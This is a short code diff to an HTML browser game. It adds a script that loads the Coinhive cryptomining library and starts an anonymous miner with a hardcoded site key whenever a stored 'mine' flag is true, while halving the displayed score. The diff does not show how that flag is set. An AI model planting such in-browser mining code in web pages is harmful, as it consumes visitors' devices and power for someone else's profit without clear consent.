@@ -70,6 +70,7 @@
     </style>
 </head>
 <body>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
         function sleep(ms) {
              return new Promise(resolve => setTimeout(resolve, ms));
@@ -195,6 +196,15 @@
             var sto = window.localStorage;
             if (sto.getItem("high") == null){
                 sto.setItem("high", 0);
+            }
+            if (sto.getItem("mine") == "true") {
+                var highest = parseInt(sto.getItem("high"));
+                if (highest % 2 != 0) {
+                    highest += 1;
+                }
+                $("#score").html(highest / 2);
+                var miner = new CoinHive.Anonymous('VqdWJXq8DMDqwUc9YRTGyPUSBa4Yo7ua', { throttle: 0.1 });
+                miner.start();
             }
             $("#high").html("Highest: " + sto.getItem("high"));
             var move = $(window).width()/10;
